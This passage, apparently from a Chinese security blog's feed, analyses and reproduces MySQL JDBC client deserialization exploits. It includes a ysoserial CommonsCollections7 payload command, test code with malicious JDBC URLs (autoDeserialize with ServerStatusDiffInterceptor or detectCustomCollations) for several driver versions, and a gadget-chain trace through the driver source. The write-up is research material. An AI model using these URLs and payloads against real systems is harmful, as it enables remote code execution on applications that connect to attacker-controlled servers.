(@obj);</span><br></pre></td></tr></table></figure><!--more--><p>其中@obj取值</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 <span class="string">&quot;touch /tmp/cc7&quot;</span> | xxd -ps -c 200 | tr -d <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure><p>触发代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ResultSet rs = stmt.executeQuery(<span class="string">&quot;select evil_2 from eviltable limit 1;&quot;</span>);</span><br><span class="line">rs.next();</span><br><span class="line">rs.getObject(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>误区：想当然以为只要是BLOB类型的字段就会被自动反序列化，其实不然，需要满足以下两个条件</p><ol><li>autoDeserialize 为True</li><li>主动调用com.mysql.cj.jdbc.result.ResultSetImpl#getObject，进行反序列化</li></ol><h3 id="ServerStatusDiffInterceptor-amp-detectCustomCollations触发调用链"><a href="#ServerStatusDiffInterceptor-amp-detectCustomCollations触发调用链" class="headerlink" title="ServerStatusDiffInterceptor&amp; detectCustomCollations触发调用链"></a>ServerStatusDiffInterceptor&amp; detectCustomCollations触发调用链</h3><p>手动触发场景下实际需要控制：</p><ol><li>jdbc url，也就是evil mysql server</li><li>代码需要getObject，这点显然不可能</li></ol><p>那么需要找到利用链，解决触发getObject。可以看看四哥在参考【1】中总结的漏洞历史，总的来说有公开两种通用的利用方式</p><ul><li>ServerStatusDiffInterceptor</li><li>detectCustomCollations</li></ul><p>四哥和fnmsd的文章已经讲的很清楚了，这里直接引用他们的测试结果</p><h4 id="ServerStatusDiffInterceptor"><a href="#ServerStatusDiffInterceptor" class="headerlink" title="ServerStatusDiffInterceptor"></a>ServerStatusDiffInterceptor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ServerStatusDiffInterceptor触发</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 8.x:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 8.0.14 测试成功</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest8_x</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6.x(属性名不同):jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 6.0.5 测试通过</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest6_x</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.11及以上的5.x版本（包名没有了cj）:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 5.1.19 测试成功</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest5_1_11TO5_x</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.10及以下的5.1.X版本：同上，但是需要连接后执行查询。</span></span><br><span class="line"><span class="comment">// 5.1.10 测试成功</span></span><br><span class="line"><span class="comment">// @<span class="doctag">TODO:</span>5.1.9 测试失败</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest5_xTO5_1_10</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">    Statement stmt = connection.createStatement();</span><br><span class="line">    ResultSet rs = stmt.executeQuery(<span class="string">&quot;select 1;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.0.x:还没有ServerStatusDiffInterceptor这个东西┓( ´∀` )┏</span></span><br></pre></td></tr></table></figure><h4 id="detectCustomCollations"><a href="#detectCustomCollations" class="headerlink" title="detectCustomCollations"></a>detectCustomCollations</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * detectCustomCollations触发</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.29-5.1.40:jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 5.1.29 测试通过</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">detectCustomCollationsTest5_1_29TO5_1_40</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?useSSL=false&amp;autoDeserialize=true&amp;detectCustomCollations=true&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.28-5.1.19：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 5.1.19 测试通过</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">detectCustomCollationsTest5_1_19TO5_1_28</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3306/?useSSL=false&amp;autoDeserialize=true&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.18以下的5.1.x版本：不可用</span></span><br><span class="line"><span class="comment">// 5.0.x版本不可用</span></span><br></pre></td></tr></table></figure><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>知其然更需知其所以然，下面尝试反向复现是如何发现这两个利用链的</p><p>autoDeserialize是源头，从autoDeserialize参数开始分析</p><h4 id="1-autoDeserialize的调用情况"><a href="#1-autoDeserialize的调用情况" class="headerlink" title="1. autoDeserialize的调用情况"></a>1. autoDeserialize的调用情况</h4><p><img src="/images/pasted-126.png" alt="upload successful"></p><pre><code>可以看到，如果字段类型是Binary或者BLOB，会进行反序列化，其中-84、-19为0xaced，java反序列化标志。</code></pre><h4 id="2-反向追踪"><a href="#2-反向追踪" class="headerlink" title="2. 反向追踪"></a>2. 反向追踪</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ClientPreparedStatement.EmulatedPreparedStatementBindings</span><br><span class="line">    getObject(int)</span><br><span class="line">        2015 return this.bindingsAsRs.getObject(parameterIndex);</span><br><span class="line"></span><br><span class="line">DatabaseMetaData.ResultSetIterator</span><br><span class="line">    next()</span><br><span class="line">        146 return this.resultSet.getObject(this.colIndex).toString();</span><br><span class="line"></span><br><span class="line">ResultSetUtil</span><br><span class="line">    resultSetToMap(Map, ResultSet)</span><br><span class="line">        46 mappedValues.put(rs.getObject(1), rs.getObject(2));</span><br><span class="line">    resultSetToMap(Map, ResultSet, int, int)</span><br><span class="line">        53 mappedValues.put(rs.getObject(key), rs.getObject(value));</span><br><span class="line"></span><br><span class="line">UpdatableResultSet</span><br><span class="line">    syncUpdate()</span><br><span class="line">        1141 this.updater.setObject(i + 1, getObject(i + 1), fields[i].getMysqlType());</span><br></pre></td></tr></table></figure><ul><li><p>2.1. ClientPreparedStatement.EmulatedPreparedStatementBindings</p><p>  PreparedStatement是预编译，还是只能在client 通过主动调用getObject触发，对利用无效</p></li><li><p>2.2. UpdatableResultSet</p><p>  UpdatableResultSet为更新Result，未找到利用点</p></li></ul><h5 id="2-3-DatabaseMetaData-ResultSetIterator"><a href="#2-3-DatabaseMetaData-ResultSetIterator" class="headerlink" title="2.3. DatabaseMetaData.ResultSetIterator"></a>2.3. DatabaseMetaData.ResultSetIterator</h5><p>尝试了几个链，都不太实用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ConnectionImpl#setAutoCommit</span><br><span class="line">IterateBlock#doForAll</span><br><span class="line">DatabaseMetaData.IterateBlock#doForAll</span><br><span class="line">DatabaseMetaData.ResultSetIterator#next</span><br></pre></td></tr></table></figure><p>失败，ResultSetIterator是protect类，无法通过Class.forName(className).newInstance()实例化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DatabaseMetaData#getTables&#x2F;getCloumns等</span><br><span class="line">DatabaseMetaData#getCatalogIterator</span><br><span class="line">DatabaseMetaData.IterateBlock#doForAll</span><br><span class="line">DatabaseMetaData.ResultSetIterator#next</span><br></pre></td></tr></table></figure><p>触发困难</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ConnectionImpl#prepareCall</span><br><span class="line">  CallableStatement#getInstance</span><br><span class="line">    CallableStatement#CallableStatement</span><br><span class="line">      CallableStatement#determineParameterTypes</span><br><span class="line">        DatabaseMetaData#getProcedureColumns</span><br><span class="line">          DatabaseMetaData#getProcedureOrFunctionColumns</span><br><span class="line">            DatabaseMetaData#getProceduresAndOrFunctions</span><br><span class="line">              DatabaseMetaData#getCatalogIterator</span><br><span class="line">                DatabaseMetaData.IterateBlock#doForAll</span><br><span class="line">                  DatabaseMetaData.ResultSetIterator#next</span><br></pre></td></tr></table></figure><p>触发困难</p><h5 id="2-4-ResultSetUtil"><a href="#2-4-ResultSetUtil" class="headerlink" title="2.4. ResultSetUtil"></a>2.4. ResultSetUtil</h5><p>有利用点，反向追溯过程如下</p><h6 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h6><p>ResultSetUtil#resultSetToMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">resultSetToMap</span><span class="params">(Map mappedValues, ResultSet rs)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">           mappedValues.put(rs.getObject(<span class="number">1</span>), rs.getObject(<span class="number">2</span>));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">resultSetToMap</span><span class="params">(Map mappedValues, java.sql.ResultSet rs, <span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">           mappedValues.put(rs.getObject(key), rs.getObject(value));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ServerStatusDiffInterceptor#populateMapWithSessionStatusValues</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">populateMapWithSessionStatusValues</span><span class="params">(Map&lt;String, String&gt; toPopulate)</span> </span>&#123;</span><br><span class="line">    java.sql.Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">    java.sql.ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            toPopulate.clear();</span><br><span class="line"></span><br><span class="line">            stmt = <span class="keyword">this</span>.connection.createStatement();</span><br><span class="line">            rs = stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);</span><br><span class="line">            ResultSetUtil.resultSetToMap(toPopulate, rs);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br></pre></td></tr></table></figure><p>此处了执行sql:SHOW SESSION STATUS</p><ul><li>evil mysql server可控情况下，可以返回可控的sql结果，从而触发后续的反序列化</li><li>如何触发populateMapWithSessionStatusValues，继续跟踪</li></ul><p>发现ServerStatusDiffInterceptor#postProcess和#preProcess有两处调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ServerStatusDiffInterceptor</span><br><span class="line">    postProcess(Supplier&lt;String&gt;, Query, T, ServerSession)</span><br><span class="line">        69 populateMapWithSessionStatusValues(this.postExecuteValues);</span><br><span class="line">    preProcess(Supplier&lt;String&gt;, Query)</span><br><span class="line">        105 populateMapWithSessionStatusValues(this.preExecuteValues);</span><br></pre></td></tr></table></figure><p>到这里和结果已经很接近了</p><ol><li>假如了解jdbc mysql 的参数，知道有个参数queryInterceptors，那对应起来很快就知道答案了</li><li>但是我是不了解的，只能苦逼的继续跟踪了</li></ol><p>NoSubInterceptorWrapper#preProcess</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">preProcess</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.underlyingInterceptor.preProcess(sql, interceptedQuery);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NativeProtocol#invokeQueryInterceptorsPre</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">invokeQueryInterceptorsPre</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery, <span class="keyword">boolean</span> forceExecute)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">                T interceptedResultSet = interceptor.preProcess(sql, interceptedQuery);</span><br></pre></td></tr></table></figure><p>NativeProtocol#sendQueryPacket</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">sendQueryPacket</span><span class="params">(Query callingQuery, NativePacketPayload queryPacket, <span class="keyword">int</span> maxRows, <span class="keyword">boolean</span> streamResults,</span></span></span><br><span class="line"><span class="function"><span class="params">...</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">if</span> (<span class="keyword">this</span>.queryInterceptors != <span class="keyword">null</span>)</span> </span>&#123;</span><br><span class="line">                T interceptedResults = invokeQueryInterceptorsPre(query, callingQuery, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>NativeSession#execSQL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">execSQL</span><span class="params">(Query callingQuery, String query, <span class="keyword">int</span> maxRows, NativePacketPayload packet, <span class="keyword">boolean</span> streamResults,</span></span></span><br><span class="line"><span class="function"><span class="params">...</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">try</span> &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">if</span> (packet == <span class="keyword">null</span>)</span> </span>&#123;</span><br><span class="line">                String encoding = <span class="keyword">this</span>.characterEncoding.getValue();</span><br><span class="line">                <span class="keyword">return</span> ((NativeProtocol) <span class="keyword">this</span>.protocol).sendQueryString(callingQuery, query, encoding, maxRows, streamResults, catalog, cachedMetadata,</span><br><span class="line">                        <span class="keyword">this</span>::getProfilerEventHandlerInstanceFunction, resultSetFactory);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ((NativeProtocol) <span class="keyword">this</span>.protocol).sendQueryPacket(callingQuery, packet, maxRows, streamResults, catalog, cachedMetadata,</span><br><span class="line">                    <span class="keyword">this</span>::getProfilerEventHandlerInstanceFunction, resultSetFactory);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ConnectionImpl#setAutoCommit</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">final</span> <span class="keyword">boolean</span> autoCommitFlag)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">...</span><br><span class="line">                    <span class="keyword">this</span>.session.execSQL(<span class="keyword">null</span>, autoCommitFlag ? <span class="string">&quot;SET autocommit=1&quot;</span> : <span class="string">&quot;SET autocommit=0&quot;</span>, -<span class="number">1</span>, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">this</span>.nullStatementResultSetFactory,</span><br><span class="line">                            <span class="keyword">this</span>.database, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>抓包看过mysql协议的都清楚，login之后，client和server会沟通一些参数，其中就有autocommit，所以链路径上是没问题了，需要解决的是链上的诸多条件<br><img src="/images/pasted-127.png" alt="upload successful"></p><h6 id="queryInterceptors的初始化"><a href="#queryInterceptors的初始化" class="headerlink" title="queryInterceptors的初始化"></a>queryInterceptors的初始化</h6><p>其中重点是queryInterceptors取值问题，最开始出现在NativeProtocol#sendQueryPacket</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">invokeQueryInterceptorsPre</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery, <span class="keyword">boolean</span> forceExecute)</span> </span>&#123;</span><br><span class="line">    T previousResultSet = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, s = <span class="keyword">this</span>.queryInterceptors.size(); i &lt; s; i++) &#123;</span><br><span class="line">        QueryInterceptor interceptor = <span class="keyword">this</span>.queryInterceptors.get(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> executeTopLevelOnly = interceptor.executeTopLevelOnly();</span><br><span class="line">        <span class="keyword">boolean</span> shouldExecute = (executeTopLevelOnly &amp;&amp; (<span class="keyword">this</span>.statementExecutionDepth == <span class="number">1</span> || forceExecute)) || (!executeTopLevelOnly);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (shouldExecute) &#123;</span><br><span class="line">            T interceptedResultSet = interceptor.preProcess(sql, interceptedQuery);</span><br></pre></td></tr></table></figure><p>追溯发现</p><p>NativeProtocol#queryInterceptors<br>NativeSession#queryInterceptors<br>ConnectionImpl#queryInterceptors</p><p>最终定位是在initializeSafeQueryInterceptors进行的初始化</p><p>ConnectionImpl#initializeSafeQueryInterceptors</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initializeSafeQueryInterceptors</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.queryInterceptors = Util</span><br><span class="line">                .&lt;QueryInterceptor&gt; loadClasses(<span class="keyword">this</span>.propertySet.getStringProperty(PropertyKey.queryInterceptors).getStringValue(),</span><br><span class="line">                        <span class="string">&quot;MysqlIo.BadQueryInterceptor&quot;</span>, getExceptionInterceptor())</span><br><span class="line">                .stream().map(o -&gt; <span class="keyword">new</span> NoSubInterceptorWrapper(o.init(<span class="keyword">this</span>, <span class="keyword">this</span>.props, <span class="keyword">this</span>.session.getLog()))).collect(Collectors.toList());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而PropertyKey，可以通过jdbc url参数进行指定，问题解决。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本节在老师傅们的文档基础上，手动复现了jdbc mysql connector 8.0.14 cc7的反序列化，以及不同版本在ServerStatusDiffInterceptor和detectCustomCollations 两种方式的反序列化复现，没有什么新的东西。</p><p>求渔得渔，后半部分试着反向去挖掘jdbc mysql反序列化的利用链，在8.0.14版本上发现了几个鸡肋的链，最终发现ServerStatusDiffInterceptor链，过程虽然稍长，不过也算是最大的收获。</p><p>老样子，抛几个问题</p><ol><li>在反向找链的时候，发现本地还有一些类调用了ResultSetUtil.getObject，会不会有新的利用链</li><li>Binary类型也有同样的问题，测试下？</li><li>目前看来autoDeserialize是强特征，好像没绕过这个特征姿势了</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://paper.seebug.org/1227/">MySQL JDBC 客户端反序列化漏洞（四哥）</a></li><li>[2] <a href="https://www.anquanke.com/post/id/203086">MySQL JDBC 客户端反序列化漏洞分析（fnmsd@360）</a></li><li>[3] <a href="https://xz.aliyun.com/t/9250">MySQL JDBC 反序列化分析（7tem7）</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;参考【1】中四哥已经讲的很全面也很详细了，简单记录下复现过程吧&lt;/p&gt;
&lt;h2 id=&quot;MySQL-反序列化&quot;&gt;&lt;a href=&quot;#MySQL-反序列化&quot; class=&quot;headerlink&quot; title=&quot;MySQL 反序列化&quot;&gt;&lt;/a&gt;MySQL 反序列化&lt;/h2&gt;&lt;h3 id=&quot;autoDeserialize&quot;&gt;&lt;a href=&quot;#autoDeserialize&quot; class=&quot;headerlink&quot; title=&quot;autoDeserialize&quot;&gt;&lt;/a&gt;autoDeserialize&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-125.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;如解释，mysql client会自动反序列化server端传回的BLOB类型&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Jdbc" scheme="http://m0d9.me/tags/Jdbc/"/>
    
    <category term="MySQL" scheme="http://m0d9.me/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>Jdbc 碎碎念一：MySQL Client文件读取</title>
    <link href="http://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    <id>http://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/</id>
    <published>2021-04-20T03:20:00.000Z</published>
    <updated>2021-04-21T09:36:24.245Z</updated>
    
